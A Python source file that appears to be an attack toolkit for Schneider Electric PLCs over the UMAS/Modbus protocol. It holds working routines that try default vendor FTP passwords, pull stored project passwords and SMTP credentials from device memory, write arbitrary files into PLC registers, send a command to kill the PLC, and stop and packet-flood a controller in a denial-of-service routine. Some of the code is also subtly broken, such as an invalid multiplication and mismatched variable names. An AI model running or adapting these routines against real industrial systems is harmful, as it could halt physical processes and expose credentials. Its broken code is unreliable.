#!/usr/bin/python

from __future__ import print_function
from datetime import datetime
import time
import sys
import getopt
import os
import logging
import iptc
import subprocess
from aux import *
from umas import *
from ftplib import FTP
from pymodbus.client.sync import ModbusTcpClient as ModbusClient

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

Command_File="commands.cmd"

##########################################
# Try default FTP passwords
##########################################
def try_default_ftp_passwords():
	user=["loader", "USER", "sysdiag"]
	passes=["fwdownload","USER","factorycast@schneider"]

	print ("\nTesting default FTP credentials")	
	print ("=================================")	
	for i in range(0, len(user)):
		ftp = FTP(get_IP())     # connect to host, default port
		try:
			a=ftp.login(user[i],passes[i])
			print ("Credentials "+user[i]+"/"+passes[i]+" works!!")
			ftp.quit()
		except:
			print ("Invalid credentials: "+user[i]+"/"+passes[i])

##########################################
#	Write block in Memory 
##########################################
def memory_write(f, block_num,close_connection=False):
	global t

	#INICIO SUBIDA ESTRATEGIA

	k=0
	b=hex(block_num).replace('0x', '')
       	if len(b) == 1:
       		b = '0'+b
		
	dot()
	write_screen ("\nStarting memory write of block "+ str(block_num))

	position=0
	if (block_num>1) & (block_num<7):	
		for u in range(0, block_num-1):
			position+=bytes_to_read[u]

		f.seek(position)
		bl=f.read(bytes_to_read[block_num-1]);	
	elif (block_num>=7):
		position=3412+1014(block_num-7)
		f.seek(position)
		bl=f.read(blocksize);	
	elif (block_num==1):
		bl=f.read(64);	

	cad=""	
	for ch in bl:
		c=hex(ord(ch)).replace('0x','')	
		if len(c)==1:
			c='0'+c
		cad=cad+" "+c

	longitud=len(bl)
	d=hex(longitud).replace('0x', '')
	e=""
	if (len(d)==1):
		e='0'+d+" 00"
	if (len(d)==2):
		e=d+" 00"
	if (len(d)==3):
		e=d[1:]+" 0"+d[0]
	if (len(d)==4):
		e=d[-2:]+" "+d[:2]

	#print (cad)
	#Lanzamos la peticion:
	if (longitud>0):
		k=k+1
		send_command("01 31 00 01 "+b+" 00 "+e+cad)
		time.sleep(0.6)
		check_error("\nError: An error ocurred while writing block "+str(block_num)+" on strategy upload")


	#CIERRE DE LA CONEXION
	if close_connection:
		time.sleep(0.6)
		dot()
		b=hex(k-1).replace('0x', '')
       		if len(b) == 1:
       			b = '0'+b

		send_command("01 32 00 01 "+b+" 00")
	
		send_keep_alive();
		time.sleep(0.3)

		read_sections13_14()
		dot()
		read_sections13_14()
		dot()
	

##########################################
#  GET ALL SYSTEM BIT VALUES
##########################################
def getallsystembits():
	#System bits start with 1
	for i in range(1,128):
		get_systembit(i)		

def getallsystemwords():
	for i in range(1,100):
		get_systemword(i)		


def monitorallsystembits():
	#System bits start with 1
	print("PLC System bits:")
	for i in range(1,128):
		sys.stdout.write (str(monitor_systembit(i)))
		sys.stdout.flush()
		if (i%16==0):
			sys.stdout.write ("\n")
		elif (i%8==0):
			sys.stdout.write ("-")

		sys.stdout.flush()
			


##########################################
# Kill_PLC
##########################################
def kill_plc():

#	MALICIOUS_FILE="mal-apx2.apx"
#
#        send_keep_alive()
#        time.sleep(0.5)
#
#        if (FwId=="2.70"):
#                send_command(FW27Code+" 36 04 00 00")
#        else:
#                send_command("01 36 04 00 00")
#
#        time.sleep(0.5)
#
#	send_keep_alive()
#	upload_initialization()
#
#	dot()
#	send_command("01 30 00 01")
#	time.sleep(0.6)
#	f=open(MALICIOUS_FILE, "rb")
#
#	#memory_write(f,1)
#	memory_write(f,2)
#	#memory_write(f,3)
#	#memory_write(f,4)
#	send_command("00 20")
#	time.sleep(0.6)
#	reset_connection()

	#send_command("00 20 00 02 00 50 3F 00 00 "+get_blocksize_str())
	send_command("00 20 00 02 00 50 9F 00 00 "+get_blocksize_str())

##########################################
# Extract Network Information
##########################################
def extract_network_information(f):
	write_screen("\n\nNetwork information")
	write_screen("\n====================")

	bl=f.read(4) #Unknown data
	bl=f.read(4) #Unknown data
	bl=f.read(4) 
	write_screen("\nInternal IP Address: "+str(ord(bl[3]))+"."+str(ord(bl[2]))+"."+str(ord(bl[1]))+"."+str(ord(bl[0])))
	bl=f.read(4) #Network Mask
	write_screen("\nNetwork Mask: "+str(ord(bl[3]))+"."+str(ord(bl[2]))+"."+str(ord(bl[1]))+"."+str(ord(bl[0])))
	bl=f.read(4) 
	write_screen("\nGateway IP: "+str(ord(bl[3]))+"."+str(ord(bl[2]))+"."+str(ord(bl[1]))+"."+str(ord(bl[0])))

	end_messages_section=f.tell()
	f.seek(end_messages_section+3103)	

	#print ("\nDetecto si SNMP esta activo en: "+str(f.tell()))
	b=f.read(1)
	if (ord(b[0])>0):
		#SNMP activated
		write_screen("\n\nSNMP is active!!!")
		write_screen("\n=================")
		write_screen("\nSNMP keys:"+str(f.read(15))+","+str(f.read(15))+","+str(f.read(15)))
		f.read(9)
		write_screen("\nSNMP Syslocation:"+str(f.read(32)))
		f.read(2)
		write_screen("\nSNMP Syscontact:"+str(f.read(32)))
		f.read(2)
	else:
		write_screen("\nSNMP is NOT active")
		f.read(112)

	#print ("\nDetecto si SMTP esta activo en: "+str(f.tell()))
	bl=f.read(2)
	#print(ord(bl[0]))
	if (ord(bl[0])==1):
		#SMTP ACTIVATED
		write_screen("\nSMTP Server is active!!!")
		bl=f.read(4)
		write_screen ("\nSMTP IP: "+str(ord(bl[3]))+"."+str(ord(bl[2]))+"."+str(ord(bl[1]))+"."+str(ord(bl[0])))
		bl=f.read(2)
		write_screen ("\nSMTP Port: "+str((256*ord(bl[1]))+ord(bl[0])))
		#print ("\nDetecto si la autenticacion esta activada en: "+str(f.tell()))
		bl=f.read(2)
		#print (ord(bl[0]))
		if (ord(bl[0])==1):
			#Authentication enabled
			write_screen("\nUSERNAME:  "+f.read(14))
			write_screen("\nPASSWORD:  "+f.read(12))
			bl=f.read(2)
			write_screen("\nMail1 headers.From:  "+f.read(32))
			f.read(2)
			write_screen("\nMail1 headers.To:  "+f.read(128))
			f.read(2)
			write_screen("\nMail1 headers.Subject:  "+f.read(32))
			f.read(2)

			write_screen("\nMail2 headers.From:  "+f.read(32))
			f.read(2)
			write_screen("\nMail2 headers.To:  "+f.read(128))
			f.read(2)
			write_screen("\nMail2 headers.Subject:  "+f.read(32))
			f.read(2)
			
			write_screen("\nMail3 headers.From:  "+f.read(32))
			f.read(2)
			write_screen("\nMail3 headers.To:  "+f.read(128))
			f.read(2)
			write_screen("\nMail3 headers.Subject:  "+f.read(32))
			f.read(2)
		else:
			write_screen("\nAuthentication is not activated")
			f.read(622)
	else:
		write_screen("\nSMTP Server is NOT active")
		f.read(630)
		
	
##########################################
# Extract Information
##########################################
def extract_information():
	
	TMP_FILE_NAME="/tmp/kkqlopdpis"
	##download_strategy(TMP_FILE_NAME)

	vvvv=is_verb()
	set_verb(True)

	write_screen("\n\n\n")
	write_screen("\nDevice information")
	write_screen("\n=====================")

	write_screen("\nDevice:"+str(get_HwDesc()))
	write_screen("\nFwId:"+get_FwId())
	write_screen("\nIr:"+str(get_Ir()))
	write_screen("\nHwId:"+get_HwId())
	write_screen("\nFwLoc:"+get_FwLoc())

	write_screen("\n")
	write_screen("\nProject information")
	write_screen("\n=====================")


	##### CRC ########
	f=open(TMP_FILE_NAME, "rb")
	f.seek(11)
	bl=f.read(4)
	cad=BintoHex(bl)
	write_screen("\nCRC:"+cad.upper())

	##### Project name #####
	f.seek(1192) #4A8h --- 45Ch
	write_screen("\nProject name:")
	bl=f.read(800)
	
	byte=0
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nComments in project:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nStored Password:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nExtra info 1:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nExtra info 2:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nExtra info 3:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nExtra info 4:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nUnity Version:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nExtra info 5:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nExtra info 6:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nProject ID:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	byte+=1
	write_screen("\nSTU project URL:")
	while (bl[byte].encode('HEX')!="00"):
		write_screen(str(bl[byte]))
		byte+=1

	f.seek(2752)
	bl=f.read(2)
	write_screen("\nNumber of M% bits:"+str((256*ord(bl[1]))+ord(bl[0])))

	f.seek(2786)
	bl=f.read(2)
	write_screen("\nNumber of MW% words:"+str((((256*ord(bl[1]))+ord(bl[0]))-272)//2))

	f.seek(2818)
	bl=f.read(2)
	KW_bytes=(256*ord(bl[1]))+ord(bl[0])+1
	write_screen("\nNumber of KW% words:"+str(KW_bytes//2))

	next_section_start=2832+KW_bytes

	f.seek(next_section_start)
	a=0
	while (a==0):
		a=ord(f.read(1))
	f.read(192)
	
	#######write_screen("\nError messages:")
	#######sys.stdout.flush() 

	a=0
	b=0
	EOS=False
	while (EOS==False):
		b=f.read(1)
		#######write_screen(str(b))
		if (ord(b)==255):
			c=f.read(1)
			if (ord(c)==255):
				d=f.read(1)
				if (ord(d)==255):
					e=f.read(1)
					if (ord(e)==255):
						EOS=True


	#END OF MESSAGES SECTION

	EOS=False
	while (EOS==False):
		b=f.read(1)
		if (ord(b)==255):
			c=f.read(1)
			if (ord(c)==255):
				d=f.read(1)
				if (ord(d)==255):
					e=f.read(1)
					if (ord(e)==255):
						EOS=True

	#START OF NETWORK SECTION

	extract_network_information(f)

	#stop only if find "FF FF" or "50 4B". That means a new comms module or the end of network section
	EOS=False
	NOC=False
	PK=False
	while (EOS==False):
		b=f.read(1)
		if (ord(b)==255):
			c=f.read(1)
			if (ord(c)==255):
				d=f.read(1)
				if (ord(d)==255):
					e=f.read(1)
					if (ord(e)==255):
						EOS=True
						NOC=True
		elif (ord(b)==80):
			c=f.read(1)
			if (ord(c)==75):
				EOS=True

	#"PK Found"
	if (NOC):
		write_screen("\n\nNew communications module found!!")
		#f.read(1)
		extract_network_information(f)

	f.close()


##################
	print ("\n\nINFORMATION OBTAINED")
	print ("====================")

	write_screen("Communication module:")
	sys.stdout.flush() 

	UMAS_packet=None
	while not UMAS_packet:
		UMAS_packet=get_UMAS_packet(device_information())
		time.sleep(0.2)
	
	if (UMAS_Packet[0:8].find("00fd") >= 0):
		write_screen("*** ERROR ***\n")
		sys.stdout.flush() 
	else:
		device_length=HextoInt(UMAS_packet[46:50])
		text=HextoString(UMAS_packet[50:50+(2*device_length)])
		write_screen(text+"\n")
		sys.stdout.flush() 
#############
	UMAS_packet=None
	while not UMAS_packet:
		UMAS_packet=get_UMAS_packet(send_command("00 01 00"))
		time.sleep(0.2)

	write_screen("Max packet size:")
	sys.stdout.flush() 

	if (UMAS_packet[0:8].find("00fd") >= 0):
		write_screen("*** ERROR ***\n")
		sys.stdout.flush() 
		write_screen("Hostname:")
		sys.stdout.flush() 
		write_screen("*** ERROR ***\n")
		sys.stdout.flush() 
	else:
		text=str(UMAS_packet[4:8])+"("+str(HextoInt(UMAS_packet[4:8],"LITTLE_ENDIAN"))+" bytes)"
		write_screen(text+"\n")

		write_screen("hostname:")
		sys.stdout.flush() 
		hostname_length=HextoInt(UMAS_packet[26:30])
		text=HextoString(UMAS_packet[30:30+(2*hostname_length)])
		write_screen(text+"\n")

#############
	send_command("00 03 00")
	packet_received=t

	while (len(str(packet_received))<62):
		send_command("00 03 00")
		packet_received=t

	write_screen("Stored project name:")
	sys.stdout.flush() 
	cadn=str(packet_received)[46:66].encode("HEX").replace('0x','')

	if ((cadn.find("00fd") >= 0)):
		write_screen("*** ERROR ***\n")
		sys.stdout.flush() 
	else:
		UMAS_packet=get_UMAS_packet(packet_received)
		project_length=HextoByte(UMAS_packet[80:82])
		text=HextoString(UMAS_packet[82:82+(2*project_length)])
		write_screen(text)
		sys.stdout.flush() 
		
		version1=HextoByte(UMAS_packet[76:78])
		version2=HextoByte(UMAS_packet[74:76])
		version3=HextoByte(UMAS_packet[72:74])
		write_screen("\nVersion: "+str(version1)+"."+str(version2)+"."+str(version3))
		sys.stdout.flush() 
		
		agno=HextoInt(UMAS_packet[68:72],"LITTLE-ENDIAN")
		mes=HextoByte(UMAS_packet[66:68])
		dia=HextoByte(UMAS_packet[64:66])
		write_screen("\nFecha: "+str(dia)+"/"+str(mes)+"/"+str(agno))
		sys.stdout.flush() 

#############
	packet_received=get_internal_card_info()
	cadn=str(packet_received)[46:62].encode("HEX").replace('0x','')
	write_screen("\nInternal card info:")
	sys.stdout.flush() 
	if ((cadn.find("fd") >= 0)):
		write_screen("*** ERROR ***\n")
		sys.stdout.flush() 
	else:
		write_screen(str(packet_received)[57:])


############
	send_command("00 20 00 14 00 00 01 00 00 C0 00")
	packet_received=t	
	bl=str(packet_received)
	cadn=str(packet_received)[46:].encode("HEX").replace('0x','')
	write_screen("\nRetrieving project information:")
	sys.stdout.flush() 
	if ((cadn.find("00fd") >= 0)):
		write_screen("*** ERROR ***\n")
		sys.stdout.flush() 
	else:
		byte=53
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

		byte+=1
		write_screen("\nComments in project:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

		byte+=1
		write_screen("\nStored Password:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

		byte+=1
		write_screen("\nExtra info 1:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

		byte+=1
		write_screen("\nExtra info 2:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1
	
		byte+=1
		write_screen("\nExtra info 3:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1
	
		byte+=1
		write_screen("\nExtra info 4:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1
	
		byte+=1
		write_screen("\nUnity Version:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

		byte+=1
		write_screen("\nExtra info 5:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

		byte+=1
		write_screen("\nExtra info 6:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

		byte+=1
		write_screen("\nProject ID:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

		byte+=1
		write_screen("\nSTU project URL:")
		while (str(packet_received)[byte].encode('HEX')!="00"):
			write_screen(str(bl[byte]))
			byte+=1

#######
	write_screen("\n\n")
	try_default_ftp_passwords()

	ftp = FTP(get_IP())     # connect to host, default port
	try:

		write_screen("\n\nInformation obtained via FTP:")
		write_screen("\n==============================")
	
		a=ftp.login("loader","fwdownload")
		write_screen("\nLDST: "+ftp.sendcmd("LDST"))
		write_screen("\nFREE: "+ftp.sendcmd("FREE"))
		write_screen("\nDINF: "+ftp.sendcmd("DINF"))
		ftp.quit()
	except:
		a=0	

	write_screen("\n\nExtracting zlib blobs\n\n")
	write_screen("\n\n=====================\n\n")
	binwalk(TMP_FILE_NAME)

	#############os.remove(TMP_FILE_NAME)

	write_screen("\n\n===========================================\n\n")


##########################################
# STORE FILE in holding registers
##########################################
def store_file(Filename,starting):
	MAX_FILE_SIZE=3204700
	wordlist=[]
	if (os.path.isfile(Filename) & (get_IP()!="")):
		filesize=os.path.getsize(Filename)
		client = ModbusClient(get_IP(), DPORT)
		client.connect()

		if (filesize>MAX_FILE_SIZE-starting):
			print ("Error: File is too big. Max size must be "+MAX_FILE_SIZE+"bytes")	
		else:
			write_screen("Writing file to PLC...")
			pos=0
			#kk=[]
			with open(Filename, "rb") as f:
				while True:
					byteread=f.read(1)
			
					if not byteread:
						if (pos%2==1):
							wordlist.append(a)
						break

					if ((pos>0) & (pos%128==0)):
						dot()
						rq = client.write_registers(starting,wordlist,unit=0x01)
						starting+=64
						wordlist=[]
			#			kk=[]

			#		kk.append(ord(bl))

					#LITTLE-ENDIAN
					if (pos%2==0):
						a=ord(byteread)
						pos+=1
					else:
						a=256*a+ord(byteread)
						wordlist.append(a)
						pos+=1
						a=0

		rq = client.write_registers(starting,wordlist,unit=0x01)
		client.close()
		write_screen("\nFile "+Filename+"("+str(filesize)+" bytes) stored in "+str(get_IP()))
	else:
		print ("\nError: File or IP do NOT exist. Exiting")
		print ("\nFile: "+Filename)
		print ("\nIP: "+get_IP())
	
##########################################
# RECOVER FILE from holding registers
##########################################
def retrieve_file(Filename,starting, filesize):
	MAX_FILE_SIZE=2047
	blocksize=64
	#print (filesize)
	if ((starting+int(filesize)<MAX_FILE_SIZE) & (get_IP()!="")):
		write_screen("Reading file from PLC...")
		client = ModbusClient(get_IP(), DPORT)
		client.connect()
		f=open(Filename,"wb")

		while (starting < filesize):
			if ((filesize//2)-starting>=blocksize):
				#print ("Leemos "+str(blocksize)+" words desde "+str(starting)+" para llegar a "+str(filesize//2))
				#leemos 64 enteros, 128 bytes
				response = client.read_holding_registers(starting,blocksize, unit=0x01)
				dot()
			else:
#				print ("Leemos "+str(filesize//2-starting)+" words desde "+str(starting)+" para llegar a "+str(filesize//2))
				response = client.read_holding_registers(starting,(filesize//2)-starting+2, unit=0x01)
				starting=filesize+1
		
			bytes=[]
			regs=[]	
	       		if response:
       	       			for regnum in range(1,len(response.registers)+1):
					regs.append(response.registers[regnum-1])
					if ((starting>filesize) & (regnum==len(response.registers))):
						print (response.registers[regnum-2])
						bytes.append(response.registers[regnum-1]%256)	
					else:
						bytes.append(response.registers[regnum-1]//256)
						bytes.append(response.registers[regnum-1]%256)	
	
				#Last word is only 1 byte long...	
					#print (regnum)
					#bytes.append(response.registers[regnum]%256)	
					
			else:
				print ("Error: could not read any register from PLC")

			f.write(bytearray(bytes))
			starting+=64

			
		f.close()	
		client.close()
		write_screen("\n"+str(filesize)+" bytes recovered from PLC")
	else:
		print ("Error: File does NOT exist. Exiting")
	
	
##########################################
# PLC DOS
##########################################
def plc_dos():
	initialize()
	read_sections13_14()
	send_id()
	stop_plc();
	

	####./isic -D -s rand -d <IP> -F 50 -p 10000000 -k 20 -r 10
	process = Popen(['isic', '-D', '-s rand', '-d '+get_IP(), '-F 50', '-p 10000000','-k 20','-r 10'])
	
##########################################
# Extract Zlib Blobs
##########################################
def binwalk_file(Filename):
	initialize()
	read_sections13_14()
	send_id()
	stop_plc();
	

	####./binwalk -e fichero.apx -o output
	process = subprocess.Popen(['binwalk','-e',Filename])

